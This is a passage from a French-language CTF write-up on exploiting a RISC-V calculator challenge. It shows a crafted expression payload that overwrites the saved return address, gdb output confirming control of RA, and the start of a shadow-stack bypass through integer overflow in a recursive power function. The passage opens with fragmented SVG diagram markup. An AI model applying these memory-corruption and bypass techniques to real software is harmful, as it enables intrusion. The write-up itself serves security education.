<text text-anchor='middle' x='424' y='500' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='432' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='432' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='432' y='164' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='432' y='260' fill='currentColor' style='font-size:1em'>[</text>
<text text-anchor='middle' x='432' y='276' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='432' y='468' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='432' y='484' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='432' y='500' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='440' y='132' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='440' y='148' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='440' y='164' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='440' y='180' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='440' y='260' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='440' y='276' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='440' y='436' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='440' y='452' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='440' y='500' fill='currentColor' style='font-size:1em'>k</text>
<text text-anchor='middle' x='448' y='132' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='448' y='148' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='448' y='164' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='448' y='180' fill='currentColor' style='font-size:1em'>'</text>
<text text-anchor='middle' x='448' y='260' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='448' y='276' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='448' y='436' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='448' y='452' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='448' y='468' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='448' y='484' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='448' y='500' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='456' y='132' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='456' y='148' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='456' y='164' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='456' y='180' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='456' y='260' fill='currentColor' style='font-size:1em'>]</text>
<text text-anchor='middle' x='456' y='276' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='456' y='436' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='456' y='452' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='456' y='468' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='456' y='484' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='464' y='132' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='464' y='148' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='464' y='180' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='464' y='276' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='464' y='452' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='464' y='468' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='464' y='484' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='472' y='132' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='472' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='472' y='164' fill='currentColor' style='font-size:1em'>√©</text>
<text text-anchor='middle' x='472' y='180' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='472' y='260' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='472' y='276' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='472' y='436' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='472' y='452' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='472' y='484' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='480' y='132' fill='currentColor' style='font-size:1em'>[</text>
<text text-anchor='middle' x='480' y='164' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='480' y='180' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='480' y='260' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='480' y='276' fill='currentColor' style='font-size:1em'>[</text>
<text text-anchor='middle' x='480' y='436' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='480' y='452' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='480' y='468' fill='currentColor' style='font-size:1em'>√©</text>
<text text-anchor='middle' x='480' y='484' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='488' y='132' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='488' y='148' fill='currentColor' style='font-size:1em'>q</text>
<text text-anchor='middle' x='488' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='488' y='180' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='488' y='260' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='488' y='276' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='488' y='436' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='488' y='452' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='488' y='468' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='496' y='132' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='496' y='148' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='496' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='496' y='180' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='496' y='260' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='496' y='276' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='496' y='436' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='496' y='452' fill='currentColor' style='font-size:1em'>[</text>
<text text-anchor='middle' x='496' y='468' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='496' y='484' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='504' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='504' y='148' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='504' y='164' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='504' y='260' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='504' y='276' fill='currentColor' style='font-size:1em'>]</text>
<text text-anchor='middle' x='504' y='436' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='504' y='452' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='504' y='468' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='504' y='484' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='512' y='132' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='512' y='164' fill='currentColor' style='font-size:1em'>√©</text>
<text text-anchor='middle' x='512' y='180' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='512' y='260' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='512' y='436' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='512' y='452' fill='currentColor' style='font-size:1em'>]</text>
<text text-anchor='middle' x='512' y='468' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='520' y='132' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='520' y='148' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='520' y='180' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='520' y='260' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='520' y='276' fill='currentColor' style='font-size:1em'>(</text>
<text text-anchor='middle' x='520' y='436' fill='currentColor' style='font-size:1em'>√©</text>
<text text-anchor='middle' x='520' y='468' fill='currentColor' style='font-size:1em'>√©</text>
<text text-anchor='middle' x='520' y='484' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='528' y='132' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='528' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='528' y='164' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='528' y='180' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='528' y='260' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='528' y='276' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='528' y='436' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='528' y='452' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='528' y='468' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='528' y='484' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='536' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='536' y='148' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='536' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='536' y='260' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='536' y='276' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='536' y='436' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='544' y='132' fill='currentColor' style='font-size:1em'>]</text>
<text text-anchor='middle' x='544' y='148' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='544' y='260' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='544' y='276' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='544' y='452' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='544' y='468' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='544' y='484' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='552' y='164' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='552' y='260' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='552' y='276' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='552' y='436' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='552' y='452' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='552' y='468' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='552' y='484' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='560' y='132' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='560' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='560' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='560' y='276' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='560' y='436' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='560' y='468' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='568' y='132' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='568' y='148' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='568' y='164' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='568' y='260' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='568' y='276' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='568' y='436' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='568' y='468' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='568' y='484' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='576' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='576' y='164' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='576' y='260' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='576' y='276' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='576' y='468' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='576' y='484' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='584' y='132' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='584' y='148' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='584' y='164' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='584' y='276' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='584' y='436' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='584' y='468' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='592' y='132' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='592' y='164' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='592' y='260' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='592' y='276' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='592' y='436' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='592' y='468' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='592' y='484' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='600' y='132' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='600' y='164' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='600' y='260' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='600' y='276' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='600' y='468' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='600' y='484' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='608' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='608' y='260' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='608' y='436' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='608' y='468' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='608' y='484' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='616' y='164' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='616' y='276' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='616' y='436' fill='currentColor' style='font-size:1em'>F</text>
<text text-anchor='middle' x='616' y='484' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='624' y='164' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='624' y='260' fill='currentColor' style='font-size:1em'>√†</text>
<text text-anchor='middle' x='624' y='276' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='624' y='436' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='624' y='484' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='632' y='484' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='640' y='260' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='640' y='276' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='648' y='260' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='648' y='276' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='656' y='276' fill='currentColor' style='font-size:1em'>)</text>
<text text-anchor='middle' x='672' y='276' fill='currentColor' style='font-size:1em'>q</text>
<text text-anchor='middle' x='680' y='276' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='688' y='276' fill='currentColor' style='font-size:1em'>i</text>
</g>

    </svg>
  
</div>
<p>On pourra overwrite la sauvegarde de RA, ainsi que les autres positions m√©moires de la stackframe appellante.
Pour comprendre pourquoi le canary n&rsquo;est pas modifi√©, il faut se pencher attentivement sur comment le DFS va parcourir notre arbre:</p>
<ol>
<li>Il explore la node d&rsquo;id 19, on voit dans la fonction dispatch qu&rsquo;il prend d&rsquo;abord la node de gauche.</li>
<li>Il explore ensuite la node d&rsquo;id 0 qui va mettre 1 * 1 = 1 √† l&rsquo;adresse <code>&amp;results[0]</code> donc <code>completed[16]</code>.</li>
<li>Il prend ensuite la node 18, puis la 17, puis la 16 et retourne imm√©diatement √©tant donn√© que la node est not√©e comme d√©j√† compl√©t√©e √† cause du fait que <code>completed[16]</code> vaille maitnenant 1.</li>
<li>Le DFS remonte donc √† la node 17 et √©crit donc √† <code>results[17]</code>, <code>results[16] (le canary) * 0</code>. results[17] vaut maintenant 0.</li>
<li>Il remonte ensuite √† la node 18 et √©crit √† <code>results[18] (la save de RA)</code>, <code>results[17] + NEW_RA</code>.</li>
<li>Il remonte ensuite √† la node 19 pour y √©crire mais elle ne nous est d&rsquo;aucune utilit√©.</li>
</ol>
<p>Donc si l&rsquo;on teste le payload suivant qui devrait produire le m√™me AST:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(1*1)(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0)))))))))))))))))+4702111234474983745)`
</span></span></code></pre></div><p>et que l&rsquo;on break dans gdb-multiarch √† la fin de la fonction <code>calc</code>, voil√† ce que l&rsquo;on peut voir:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"> <span class="n">RA</span>   <span class="mh">0x4141414141414141</span> <span class="p">(</span><span class="err">&#39;</span><span class="n">AAAAAAAA</span><span class="err">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">GP</span>   <span class="mh">0x16800</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">TP</span>   <span class="mh">0x4000953da0</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x4000945228</span> <span class="p">(</span><span class="n">_nl_global_locale</span><span class="p">)</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x4000941dd0</span> <span class="p">(</span><span class="n">_nl_C_LC_CTYPE</span><span class="p">)</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x400092bde8</span> <span class="p">(</span><span class="n">_nl_C_name</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x43</span> <span class="cm">/* &#39;C&#39; */</span>                                                                        
</span></span><span class="line"><span class="cl"> <span class="n">T0</span>   <span class="mh">0x400081e290</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">T1</span>   <span class="mh">0x17470</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x17</span>
</span></span><span class="line"><span class="cl"> <span class="n">T2</span>   <span class="mh">0x3</span>
</span></span><span class="line"><span class="cl"> <span class="n">S0</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">S1</span>   <span class="mh">0x1</span>
</span></span><span class="line"><span class="cl"> <span class="n">A0</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">A1</span>   <span class="mh">0x4000800348</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x1010101</span>
</span></span><span class="line"><span class="cl"> <span class="n">A2</span>   <span class="mh">0x4000800338</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x1</span>
</span></span><span class="line"><span class="cl"> <span class="n">A3</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">A4</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">A5</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">A6</span>   <span class="mh">0x174d0</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x17</span>
</span></span><span class="line"><span class="cl"> <span class="n">A7</span>   <span class="mh">0x9ef4f319ba96a051</span>
</span></span><span class="line"><span class="cl"> <span class="n">S2</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">S3</span>   <span class="mh">0x15e00</span> <span class="p">(</span><span class="n">__do_global_dtors_aux_fini_array_entry</span><span class="p">)</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x10f24</span> <span class="p">(</span><span class="n">__do_global_dtors_aux</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="n">c</span><span class="p">.</span><span class="n">addi</span> <span class="n">sp</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x10</span>                                                                                                 
</span></span><span class="line"><span class="cl"> <span class="n">S4</span>   <span class="mh">0x14260</span> <span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="n">c</span><span class="p">.</span><span class="n">addi16sp</span> <span class="n">sp</span><span class="p">,</span> <span class="o">-</span><span class="mh">0xd0</span>
</span></span><span class="line"><span class="cl"> <span class="n">S5</span>   <span class="mh">0x4000800688</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x4000800858</span> <span class="err">‚óÇ‚Äî</span> <span class="err">&#39;</span><span class="n">_</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">challenger</span><span class="o">/</span><span class="n">qemu</span><span class="o">/</span><span class="n">build</span><span class="o">/</span><span class="n">qemu</span><span class="o">-</span><span class="n">riscv64</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"> <span class="n">S6</span>   <span class="mh">0x15e00</span> <span class="p">(</span><span class="n">__do_global_dtors_aux_fini_array_entry</span><span class="p">)</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x10f24</span> <span class="p">(</span><span class="n">__do_global_dtors_aux</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="n">c</span><span class="p">.</span><span class="n">addi</span> <span class="n">sp</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x10</span>                                                                                                 
</span></span><span class="line"><span class="cl"> <span class="n">S7</span>   <span class="mh">0x400081cd78</span> <span class="p">(</span><span class="n">_rtld_local_ro</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">S8</span>   <span class="mh">0x400081d030</span> <span class="p">(</span><span class="n">_rtld_local</span><span class="p">)</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x400081e290</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">S9</span>   <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">S10</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">S11</span>  <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"> <span class="n">T3</span>   <span class="mh">0x400089afc8</span> <span class="p">(</span><span class="n">free</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0xff8537837179c54d</span>
</span></span><span class="line"><span class="cl"> <span class="n">T4</span>   <span class="mh">0x76fc8</span>
</span></span><span class="line"><span class="cl"> <span class="n">T5</span>   <span class="mh">0x4000912950</span> <span class="p">(</span><span class="n">_nl_C_LC_CTYPE_toupper</span><span class="o">+</span><span class="mi">512</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x100000000</span>
</span></span><span class="line"><span class="cl"> <span class="n">T6</span>   <span class="mh">0x1f25bc2</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">SP</span>   <span class="mh">0x40008003e0</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0xc3c3c3c3c3c38241</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">PC</span>   <span class="mh">0x13d3a</span> <span class="p">(</span><span class="n">calc</span><span class="o">+</span><span class="mi">180</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="n">c</span><span class="p">.</span><span class="n">jr</span> <span class="n">ra</span>
</span></span><span class="line"><span class="cl"><span class="err">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span><span class="p">[</span> <span class="n">DISASM</span> <span class="o">/</span> <span class="n">rv64</span> <span class="o">/</span> <span class="n">set</span> <span class="n">emulate</span> <span class="n">on</span> <span class="p">]</span><span class="err">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x13d32</span> <span class="o">&lt;</span><span class="n">calc</span><span class="o">+</span><span class="mi">172</span><span class="o">&gt;</span>    <span class="n">c</span><span class="p">.</span><span class="n">mv</span>   <span class="n">a0</span><span class="p">,</span> <span class="n">a4</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x13d34</span> <span class="o">&lt;</span><span class="n">calc</span><span class="o">+</span><span class="mi">174</span><span class="o">&gt;</span>    <span class="n">c</span><span class="p">.</span><span class="n">ldsp</span> <span class="n">ra</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">(</span><span class="n">sp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x13d36</span> <span class="o">&lt;</span><span class="n">calc</span><span class="o">+</span><span class="mi">176</span><span class="o">&gt;</span>    <span class="n">c</span><span class="p">.</span><span class="n">ldsp</span> <span class="n">s0</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">(</span><span class="n">sp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x13d38</span> <span class="o">&lt;</span><span class="n">calc</span><span class="o">+</span><span class="mi">178</span><span class="o">&gt;</span>    <span class="n">c</span><span class="p">.</span><span class="n">addi16sp</span> <span class="n">sp</span><span class="p">,</span> <span class="mh">0xc0</span>
</span></span><span class="line"><span class="cl"> <span class="err">‚ñ∫</span> <span class="mh">0x13d3a</span> <span class="o">&lt;</span><span class="n">calc</span><span class="o">+</span><span class="mi">180</span><span class="o">&gt;</span>    <span class="n">c</span><span class="p">.</span><span class="n">jr</span>   <span class="n">ra</span>                            <span class="o">&lt;</span><span class="mh">0x4141414141414141</span><span class="o">&gt;</span>
</span></span></code></pre></div><p>Yes! On a r√©ussi √† overwrite la sauvegarde de RA!</p>
<p>Avant de construire notre ROP-chain, il va nous falloir
outrepasser la shadow stack mise en place par le patch de QEMU, car si l&rsquo;on ret maintenant, la valeur <code>0x4141414141414141</code>, ne se trouvant pas dans la dark_page, le processeur va lever une exception.</p>
<h3 id="bypass-de-la-shadow-stack">Bypass de la shadow stack</h3>
<p>C&rsquo;est le probl√®me sur lequel j&rsquo;ai pass√© le plus de temps et pourtant la solution √©tait assez √©vidente! Si vous vous souvenez bien, nous avions not√© que la variable <code>dark_offset</code> mise en place lors de l&rsquo;√©mulation est un entier de 16 bits, c&rsquo;est tr√®s peu et cela signifie que nous pouvons essayer de provoquer un integer overflow. Comment ? Et bien en abusant de la fonction r√©cursive <code>handle_power</code> utilis√©e pour effectuer les calculs de puissance:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">handle_power</span> <span class="p">(</span><span class="kt">node_t</span><span class="o">*</span> <span class="n">node</span><span class="p">,</span> <span class="kt">int64_t</span> <span class="n">results</span><span class="p">[],</span> <span class="kt">int64_t</span> <span class="n">power</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">IN_SHADOW</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">power</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="kt">node_t</span> <span class="o">*</span><span class="n">node_l</span> <span class="o">=</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">.</span><span class="n">binop</span><span class="p">.</span><span class="n">node_l</span><span class="p">;</span>
